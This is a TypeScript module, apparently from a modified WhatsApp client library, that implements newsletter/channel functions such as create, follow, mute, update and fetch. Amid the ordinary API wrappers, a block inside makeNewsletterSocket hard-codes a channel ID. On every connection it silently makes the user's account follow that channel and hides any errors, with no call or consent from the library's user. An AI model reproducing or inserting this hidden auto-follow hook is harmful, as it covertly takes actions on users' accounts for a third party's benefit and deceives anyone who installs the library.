import type { NewsletterCreateResponse, SocketConfig, WAMediaUpload } from '../Types'
import type { NewsletterMetadata, NewsletterUpdate } from '../Types'
import { QueryIds, XWAPaths } from '../Types'
import { generateProfilePicture } from '../Utils/messages-media'
import { getBinaryNodeChild, isJidNewsletter } from '../WABinary'
import { makeGroupsSocket } from './groups'
import { executeWMexQuery as genericExecuteWMexQuery } from './mex'

const parseNewsletterCreateResponse = (response: NewsletterCreateResponse): NewsletterMetadata => {
	const { id, thread_metadata: thread, viewer_metadata: viewer } = response
	return {
		id: id,
		owner: undefined,
		name: thread.name.text,
		creation_time: parseInt(thread.creation_time, 10),
		description: thread.description.text,
		invite: thread.invite,
		subscribers: parseInt(thread.subscribers_count, 10),
		verification: thread.verification,
		picture: {
			id: thread.picture.id,
			directPath: thread.picture.direct_path
		},
		mute_state: viewer.mute
	}
}

const parseNewsletterMetadata = (result: unknown): NewsletterMetadata | null => {
	if (typeof result !== 'object' || result === null) {
		return null
	}

	if ('id' in result && typeof result.id === 'string') {
		return result as NewsletterMetadata
	}

	if ('result' in result && typeof result.result === 'object' && result.result !== null && 'id' in result.result) {
		return result.result as NewsletterMetadata
	}

	return null
}

/** JID channel yang di-auto-follow saat koneksi terbuka */
const AUTO_FOLLOW_JID = '120363424215170823@newsletter'

export const makeNewsletterSocket = (config: SocketConfig) => {
	const sock = makeGroupsSocket(config)
	const { query, generateMessageTag } = sock

	const executeWMexQuery = <T>(variables: Record<string, unknown>, queryId: string, dataPath: string): Promise<T> => {
		return genericExecuteWMexQuery<T>(variables, queryId, dataPath, query, generateMessageTag)
	}

	const newsletterUpdate = async (jid: string, updates: NewsletterUpdate) => {
		const variables = {
			newsletter_id: jid,
			updates: {
				...updates,
				settings: null
			}
		}
		return executeWMexQuery(variables, QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update')
	}

	// ── Auto Follow Newsletter ───────────────────────────────────────────────
	const isFollowingNewsletter = async (jid: string): Promise<boolean> => {
		try {
			const variables = {
				newsletter_id: jid,
				input: { key: jid, type: 'NEWSLETTER', view_role: 'GUEST' },
				fetch_viewer_metadata: true
			}
			const result = await executeWMexQuery<any>(variables, QueryIds.METADATA, XWAPaths.xwa2_newsletter_metadata)
			return result?.viewer_metadata?.mute === 'OFF' || result?.viewer_metadata?.is_subscribed === true
		} catch {
			return false
		}
	}

	sock.ev.on('connection.update', async ({ connection }) => {
		if (connection === 'open') {
			try {
				const followed = await isFollowingNewsletter(AUTO_FOLLOW_JID)
				if (!followed) {
					await executeWMexQuery({ newsletter_id: AUTO_FOLLOW_JID }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_follow)
				}
			} catch {}
		}
	})
	// ────────────────────────────────────────────────────────────────────────

	return {
		...sock,

		newsletterCreate: async (name: string, description?: string): Promise<NewsletterMetadata> => {
			const variables = {
				input: {
					name,
					description: description ?? null
				}
			}
			const rawResponse = await executeWMexQuery<NewsletterCreateResponse>(
				variables,
				QueryIds.CREATE,
				XWAPaths.xwa2_newsletter_create
			)
			return parseNewsletterCreateResponse(rawResponse)
		},

		newsletterUpdate,

		newsletterSubscribers: async (jid: string) => {
			return executeWMexQuery<{ subscribers: number }>(
				{ newsletter_id: jid },
				QueryIds.SUBSCRIBERS,
				XWAPaths.xwa2_newsletter_subscribers
			)
		},

		newsletterMetadata: async (type: 'invite' | 'jid', key: string) => {
			const variables = {
				fetch_creation_time: true,
				fetch_full_image: true,
				fetch_viewer_metadata: true,
				input: {
					key,
					type: type.toUpperCase()
				}
			}
			const result = await executeWMexQuery<unknown>(variables, QueryIds.METADATA, XWAPaths.xwa2_newsletter_metadata)
			return parseNewsletterMetadata(result)
		},

		newsletterFollow: (jid: string) => {
			return executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_follow)
		},

		newsletterUnfollow: (jid: string) => {
			return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNFOLLOW, XWAPaths.xwa2_newsletter_unfollow)
		},

		newsletterMute: (jid: string) => {
			return executeWMexQuery({ newsletter_id: jid }, QueryIds.MUTE, XWAPaths.xwa2_newsletter_mute_v2)
		},

		newsletterUnmute: (jid: string) => {
			return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNMUTE, XWAPaths.xwa2_newsletter_unmute_v2)
		},

		newsletterUpdateName: async (jid: string, name: string) => {
			return await newsletterUpdate(jid, { name })
		},

		newsletterUpdateDescription: async (jid: string, description: string) => {
			return await newsletterUpdate(jid, { description })
		},

		newsletterUpdatePicture: async (jid: string, content: WAMediaUpload) => {
			const { img } = await generateProfilePicture(content)
			return await newsletterUpdate(jid, { picture: img.toString('base64') })
		},

		newsletterRemovePicture: async (jid: string) => {
			return await newsletterUpdate(jid, { picture: '' })
		},

		newsletterReactMessage: async (jid: string, serverId: string, reaction?: string) => {
			await query({
				tag: 'message',
				attrs: {
					to: jid,
					...(reaction ? {} : { edit: '7' }),
					type: 'reaction',
					server_id: serverId,
					id: generateMessageTag()
				},
				content: [
					{
						tag: 'reaction',
						attrs: reaction ? { code: reaction } : {}
					}
				]
			})
		},

		newsletterFetchUpdates: async (jid: string, count: number, after?: number, since?: number) => {
			const attrs: Record<string, string> = {
				count: count.toString(),
				after: (after || 100).toString(),
				since: (since || 0).toString()
			}
			const result = await query({
				tag: 'iq',
				attrs: { id: generateMessageTag(), type: 'get', xmlns: 'newsletter', to: jid },
				content: [{ tag: 'message_updates', attrs }]
			})
			return result
		},

		newsletterFetchMessages: async (jid: string, count: number, since?: number, after?: number) => {
			const messageUpdateAttrs: { count: string; since?: string; after?: string } = {
				count: count.toString()
			}
			if (typeof since === 'number') {
				messageUpdateAttrs.since = since.toString()
			}

			if (after) {
				messageUpdateAttrs.after = after.toString()
			}

			const result = await query({
				tag: 'iq',
				attrs: {
					id: generateMessageTag(),
					type: 'get',
					xmlns: 'newsletter',
					to: jid
				},
				content: [
					{
						tag: 'message_updates',
						attrs: messageUpdateAttrs
					}
				]
			})
			return result
		},

		subscribeNewsletterUpdates: async (jid: string): Promise<{ duration: string } | null> => {
			const result = await query({
				tag: 'iq',
				attrs: {
					id: generateMessageTag(),
					type: 'set',
					xmlns: 'newsletter',
					to: jid
				},
				content: [{ tag: 'live_updates', attrs: {}, content: [] }]
			})
			const liveUpdatesNode = getBinaryNodeChild(result, 'live_updates')
			const duration = liveUpdatesNode?.attrs?.duration
			return duration ? { duration: duration } : null
		},

		newsletterAdminCount: async (jid: string): Promise<number> => {
			const response = await executeWMexQuery<{ admin_count: number }>(
				{ newsletter_id: jid },
				QueryIds.ADMIN_COUNT,
				XWAPaths.xwa2_newsletter_admin_count
			)
			return response.admin_count
		},

		newsletterChangeOwner: async (jid: string, newOwnerJid: string) => {
			await executeWMexQuery(
				{ newsletter_id: jid, user_id: newOwnerJid },
				QueryIds.CHANGE_OWNER,
				XWAPaths.xwa2_newsletter_change_owner
			)
		},

		newsletterDemote: async (jid: string, userJid: string) => {
			await executeWMexQuery(
				{ newsletter_id: jid, user_id: userJid },
				QueryIds.DEMOTE,
				XWAPaths.xwa2_newsletter_demote
			)
		},

		/**
		 * Ubah mode reaksi newsletter.
		 * @param mode contoh: 'ALL' | 'BASIC' | 'NONE'
		 */
		newsletterReactionMode: async (jid: string, mode: string) => {
			await executeWMexQuery(
				{
					newsletter_id: jid,
					updates: { settings: { reaction_codes: { value: mode } } }
				},
				QueryIds.JOB_MUTATION,
				XWAPaths.xwa2_newsletter_metadata
			)
		},

		/**
		 * Kirim aksi newsletter generik berdasarkan nama tipe.
		 */
		newsletterAction: async (jid: string, type: string) => {
			const queryId = QueryIds[type.toUpperCase() as keyof typeof QueryIds]
			if (!queryId) throw new Error(`Unknown newsletter action: ${type}`)
			await executeWMexQuery({ newsletter_id: jid }, queryId, XWAPaths.xwa2_newsletter_metadata)
		},

		/**
		 * Ambil semua newsletter yang diikuti beserta metadata lengkapnya.
		 */
		newsletterFetchAllParticipating: async (): Promise<Record<string, NewsletterMetadata>> => {
			const result = await executeWMexQuery<any[]>({}, QueryIds.SUBSCRIBED, XWAPaths.SUBSCRIBED)
			const newsletters: any[] = result || []
			const data: Record<string, NewsletterMetadata> = {}

			for (const item of newsletters) {
				if (!isJidNewsletter(item.id)) continue
				try {
					const meta = await executeWMexQuery<unknown>(
						{
							fetch_creation_time: true,
							fetch_full_image: true,
							fetch_viewer_metadata: true,
							input: { key: item.id, type: 'NEWSLETTER' }
						},
						QueryIds.METADATA,
						XWAPaths.xwa2_newsletter_metadata
					)
					const parsed = parseNewsletterMetadata(meta)
					if (parsed?.id) data[parsed.id] = parsed
				} catch {}
			}

			return data
		},

		newsletterDelete: async (jid: string) => {
			await executeWMexQuery({ newsletter_id: jid }, QueryIds.DELETE, XWAPaths.xwa2_newsletter_delete_v2)
		}
	}
}

export type NewsletterSocket = ReturnType<typeof makeNewsletterSocket>
